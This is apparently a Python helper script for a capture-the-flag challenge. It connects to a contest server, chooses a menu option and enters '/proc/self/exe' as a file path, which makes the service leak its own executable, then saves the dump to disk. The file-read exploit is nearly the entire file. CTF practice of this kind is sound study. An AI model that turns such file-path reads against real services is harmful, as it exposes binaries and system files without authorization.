import socket
import readline

host = 'eof.h4ck3r.quest'
port = 7122 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None, decode=True):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  if decode:
    print(res.decode('utf-8'))
  else:
    print(res)
  return res

def recvuntil(stop, decode=True):
  res = b''
  while stop not in res:
    res += recv(decode=decode)
  return res

def send(data):
  # TODO
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()

recvuntil(b'> ')
send(b'2')
recvuntil(b': ')
send(b'/proc/self/exe')
data = recvuntil(b'=====', decode=False)
data = data[5:]
#data = data[:data.rfind(b'\n\n======== [')]
data = data.split(b'\n     ')
data = b''.join([i[2:] for i in data])
print(data)
with open('exe', 'wb') as f:
  f.write(data)




